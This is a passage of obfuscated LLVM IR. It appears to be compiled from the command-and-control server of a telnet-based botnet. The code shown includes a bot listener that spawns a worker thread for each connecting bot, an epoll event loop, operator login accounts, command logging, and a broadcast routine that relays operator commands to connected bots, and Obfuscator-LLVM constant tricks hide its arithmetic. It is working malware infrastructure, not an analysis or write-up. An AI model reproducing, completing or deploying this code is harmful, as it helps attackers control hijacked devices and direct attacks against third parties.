  %868 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %869 = call i64 @strlen(i8* %868) #8
  %870 = icmp eq i64 %869, 0
  br i1 %870, label %871, label %872

; <label>:871:                                    ; preds = %867
  br label %311

; <label>:872:                                    ; preds = %867
  %873 = load i32, i32* %5, align 4
  %874 = sext i32 %873 to i64
  %875 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %874
  %876 = getelementptr inbounds %struct.login_info, %struct.login_info* %875, i32 0, i32 0
  %877 = getelementptr inbounds [20 x i8], [20 x i8]* %876, i32 0, i32 0
  %878 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %879 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.104, i32 0, i32 0), i8* %877, i8* %878)
  %880 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i32 0, i32 0))
  store %struct._IO_FILE* %880, %struct._IO_FILE** %56, align 8
  %881 = call i64 @time(i64* null) #7
  store i64 %881, i64* %57, align 8
  %882 = call %struct.tm* @gmtime(i64* %57) #7
  store %struct.tm* %882, %struct.tm** %58, align 8
  %883 = getelementptr inbounds [50 x i8], [50 x i8]* %59, i32 0, i32 0
  %884 = load %struct.tm*, %struct.tm** %58, align 8
  %885 = call i64 @strftime(i8* %883, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.107, i32 0, i32 0), %struct.tm* %884) #7
  %886 = load %struct._IO_FILE*, %struct._IO_FILE** %56, align 8
  %887 = getelementptr inbounds [50 x i8], [50 x i8]* %59, i32 0, i32 0
  %888 = load i32, i32* %5, align 4
  %889 = sext i32 %888 to i64
  %890 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %889
  %891 = getelementptr inbounds %struct.login_info, %struct.login_info* %890, i32 0, i32 0
  %892 = getelementptr inbounds [20 x i8], [20 x i8]* %891, i32 0, i32 0
  %893 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %894 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %886, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.108, i32 0, i32 0), i8* %887, i8* %892, i8* %893)
  %895 = load %struct._IO_FILE*, %struct._IO_FILE** %56, align 8
  %896 = call i32 @fclose(%struct._IO_FILE* %895)
  %897 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %898 = load i32, i32* %4, align 4
  %899 = load i32, i32* %5, align 4
  %900 = sext i32 %899 to i64
  %901 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %900
  %902 = getelementptr inbounds %struct.login_info, %struct.login_info* %901, i32 0, i32 0
  %903 = getelementptr inbounds [20 x i8], [20 x i8]* %902, i32 0, i32 0
  call void @broadcast(i8* %897, i32 %898, i8* %903)
  %904 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %904, i8 0, i64 2048, i32 16, i1 false)
  br label %311

; <label>:905:                                    ; preds = %311
  br label %906

; <label>:906:                                    ; preds = %905, %866, %859, %858, %836, %831, %822, %814, %806, %798, %790, %782, %774, %766, %758, %742, %724, %716, %708, %700, %692, %684, %676, %668, %660, %652, %644, %636, %628, %620, %612, %604, %596, %588, %580, %572, %564, %556, %548, %540, %532, %302, %297, %288, %280, %272, %264, %256, %248, %240, %232, %195, %194, %184, %165, %159, %134, %128
  %907 = load i32, i32* %4, align 4
  %908 = sext i32 %907 to i64
  %909 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %908
  %910 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %909, i32 0, i32 0
  store i32 0, i32* %910, align 4
  %911 = load i32, i32* %4, align 4
  %912 = call i32 @close(i32 %911)
  %913 = load volatile i32, i32* @OperatorsConnected, align 4
  %914 = add i32 %913, -393697086
  %915 = add i32 %914, -1
  %916 = sub i32 %915, -393697086
  %917 = add nsw i32 %913, -1
  store volatile i32 %916, i32* @OperatorsConnected, align 4
  br label %918

; <label>:918:                                    ; preds = %906, %377, %365, %348, %331
  %919 = load i8*, i8** %2, align 8
  ret i8* %919
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

declare i32 @system(i8*) #1

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @BotListener(i32) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %10 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %10, i32* %4, align 4
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.109, i32 0, i32 0))
  br label %14

; <label>:14:                                     ; preds = %13, %1
  %15 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* %15, i8 0, i64 16, i32 4, i1 false)
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %18 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %17, i32 0, i32 0
  store i32 0, i32* %18, align 4
  %19 = load i32, i32* %3, align 4
  %20 = trunc i32 %19 to i16
  %21 = call zeroext i16 @htons(i16 zeroext %20) #9
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = load i32, i32* %4, align 4
  %24 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %25 = call i32 @bind(i32 %23, %struct.sockaddr* %24, i32 16) #7
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %14
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.110, i32 0, i32 0))
  br label %28

; <label>:28:                                     ; preds = %27, %14
  %29 = load i32, i32* %4, align 4
  %30 = call i32 @listen(i32 %29, i32 5) #7
  store i32 16, i32* %6, align 4
  br label %31

; <label>:31:                                     ; preds = %38, %28
  %32 = load i32, i32* %4, align 4
  %33 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %34 = call i32 @accept(i32 %32, %struct.sockaddr* %33, i32* %6)
  store i32 %34, i32* %5, align 4
  %35 = load i32, i32* %5, align 4
  %36 = icmp slt i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %31
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i32 0, i32 0))
  br label %38

; <label>:38:                                     ; preds = %37, %31
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = inttoptr i64 %40 to i8*
  %42 = call i32 @pthread_create(i64* %9, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %41) #7
  br label %31
                                                  ; No predecessors!
  %44 = load i8*, i8** %2, align 8
  ret i8* %44
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %13 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %14 = load i32, i32* %5, align 4
  %15 = icmp ne i32 %14, 4
  br i1 %15, label %16, label %22

; <label>:16:                                     ; preds = %3
  %17 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %18 = load i8**, i8*** %6, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %17, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.112, i32 0, i32 0), i8* %20)
  call void @exit(i32 1) #10
  unreachable

; <label>:22:                                     ; preds = %3
  %23 = load i8**, i8*** %6, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 3
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @atoi(i8* %25) #8
  store i32 %26, i32* %10, align 4
  %27 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.114, i32 0, i32 0))
  store %struct._IO_FILE* %27, %struct._IO_FILE** @telFD, align 8
  %28 = load i8**, i8*** %6, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30) #8
  store i32 %31, i32* %9, align 4
  %32 = load i8**, i8*** %6, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @create_and_bind(i8* %34)
  store volatile i32 %35, i32* @listenFD, align 4
  %36 = load volatile i32, i32* @listenFD, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %22
  call void @abort() #10
  unreachable

; <label>:39:                                     ; preds = %22
  %40 = load volatile i32, i32* @listenFD, align 4
  %41 = call i32 @make_socket_non_blocking(i32 %40)
  store i32 %41, i32* %8, align 4
  %42 = load i32, i32* %8, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  call void @abort() #10
  unreachable

; <label>:45:                                     ; preds = %39
  %46 = load volatile i32, i32* @listenFD, align 4
  %47 = call i32 @listen(i32 %46, i32 128) #7
  store i32 %47, i32* %8, align 4
  %48 = load i32, i32* %8, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %51

; <label>:50:                                     ; preds = %45
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:51:                                     ; preds = %45
  %52 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %52, i32* @epollFD, align 4
  %53 = load volatile i32, i32* @epollFD, align 4
  %54 = icmp eq i32 %53, -1
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %51
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.116, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:56:                                     ; preds = %51
  %57 = load volatile i32, i32* @listenFD, align 4
  %58 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %59 = bitcast %union.epoll_data* %58 to i32*
  store i32 %57, i32* %59, align 1
  %60 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %60, align 1
  %61 = load volatile i32, i32* @epollFD, align 4
  %62 = load volatile i32, i32* @listenFD, align 4
  %63 = call i32 @epoll_ctl(i32 %61, i32 1, i32 %62, %struct.epoll_event* %11) #7
  store i32 %63, i32* %8, align 4
  %64 = load i32, i32* %8, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %56
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:67:                                     ; preds = %56
  %68 = load i32, i32* %9, align 4
  %69 = add i32 %68, 910963536
  %70 = add i32 %69, 2
  %71 = sub i32 %70, 910963536
  %72 = add nsw i32 %68, 2
  %73 = zext i32 %71 to i64
  %74 = call i8* @llvm.stacksave()
  store i8* %74, i8** %12, align 8
  %75 = alloca i64, i64 %73, align 16
  br label %76

; <label>:76:                                     ; preds = %83, %67
  %77 = load i32, i32* %9, align 4
  %78 = sub i32 %77, -853299909
  %79 = add i32 %78, -1
  %80 = add i32 %79, -853299909
  %81 = add nsw i32 %77, -1
  store i32 %80, i32* %9, align 4
  %82 = icmp ne i32 %77, 0
  br i1 %82, label %83, label %92

; <label>:83:                                     ; preds = %76
  %84 = load i32, i32* %9, align 4
  %85 = sub i32 %84, 924941423
  %86 = add i32 %85, 1
  %87 = add i32 %86, 924941423
  %88 = add nsw i32 %84, 1
  %89 = sext i32 %87 to i64
  %90 = getelementptr inbounds i64, i64* %75, i64 %89
  %91 = call i32 @pthread_create(i64* %90, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #7
  br label %76

; <label>:92:                                     ; preds = %76
  %93 = getelementptr inbounds i64, i64* %75, i64 0
  %94 = load i32, i32* %10, align 4
  %95 = sext i32 %94 to i64
  %96 = inttoptr i64 %95 to i8*
  %97 = call i32 @pthread_create(i64* %93, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %96) #7
  br label %98

; <label>:98:                                     ; preds = %99, %92
  br label %99

; <label>:99:                                     ; preds = %98
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.117, i32 0, i32 0))
  %100 = call i32 @sleep(i32 60)
  br label %98
                                                  ; No predecessors!
  %102 = load i32, i32* %4, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

; <label>:18:                                     ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #7
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.119, i32 0, i32 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

; <label>:23:                                     ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

; <label>:25:                                     ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

; <label>:28:                                     ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #7
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %28
  br label %63

; <label>:42:                                     ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #7
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.120, i32 0, i32 0))
  br label %48

; <label>:48:                                     ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #7
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

; <label>:59:                                     ; preds = %48
  br label %67

; <label>:60:                                     ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

; <label>:63:                                     ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25

; <label>:67:                                     ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

; <label>:70:                                     ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.121, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %76

; <label>:73:                                     ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #7
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

; <label>:76:                                     ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
